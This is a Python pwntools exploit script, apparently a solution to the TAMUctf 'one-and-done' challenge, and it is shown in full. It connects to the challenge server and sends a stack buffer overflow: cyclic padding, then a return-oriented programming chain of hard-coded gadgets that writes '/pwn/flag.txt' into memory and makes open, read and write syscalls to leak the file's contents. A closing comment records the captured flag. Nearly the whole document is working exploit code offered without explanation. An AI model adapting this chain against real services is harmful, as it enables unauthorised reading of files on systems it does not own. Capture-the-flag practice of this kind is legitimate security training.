
from pwn import *

r = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")

r.readline()

flag = b'/pwn/fla'
flag1 = b'g.txt\x00\x00\x00'

mov_add = 0x0000000000402340 #: mov qword ptr [rbx + 8], rdx; pop rbx; ret;

pop_rax = 0x000000000040100b #: pop rax; ret; 
pop_rbx = 0x00000000004013ce #: pop rbx; ret; 
pop_rdx = 0x0000000000401f31 #: pop rdx; ret; 
pop_rdi = 0x0000000000401793 #: pop rdi; ret;
pop_rsi = 0x0000000000401713 #: pop rsi; ret; 

syscall = 0x0000000000401ab2 #: syscall; ret;

buf = 0x404290

p = cyclic(296)
p += p64(pop_rbx)
p += p64(buf-8)
p += p64(pop_rdx)
p += p64(u64(flag))
p += p64(mov_add)
p += p64(buf)
p += p64(pop_rdx)
p += p64(u64(flag1))
p += p64(mov_add)
p += p64(buf)
p += p64(pop_rax)
p += p64(2)
p += p64(pop_rdi)
p += p64(buf)
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(syscall)
p += p64(pop_rax)
p += p64(0)
p += p64(pop_rdi)
p += p64(3)
p += p64(pop_rsi)
p += p64(buf+0x30)
p += p64(pop_rdx)
p += p64(29)
p += p64(syscall)
p += p64(pop_rax)
p += p64(1)
p += p64(pop_rdi)
p += p64(1)
p += p64(syscall)

r.sendline(p)

print(f'\n{r.recv().decode()}\n')

# gigem{trivial_but_its_static}